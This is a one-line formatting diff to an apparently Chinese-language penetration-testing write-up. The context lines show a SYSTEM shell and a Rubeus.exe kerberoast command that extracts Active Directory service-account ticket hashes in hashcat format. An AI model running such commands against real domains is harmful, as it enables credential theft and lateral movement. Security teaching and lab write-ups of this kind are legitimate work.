@@ -796,7 +796,7 @@ Closing writers
 使用这台域内主机进行 Kerberoast/Kerberoasting 攻击：
 
 ```
-PS C:\Windows\system32>whoami
+PS C:\Windows\system32> whoami
 nt authority\system
 
 PS C:\Users\Administrator\Desktop> .\Rubeus.exe kerberoast /nowrap /format:hashcat
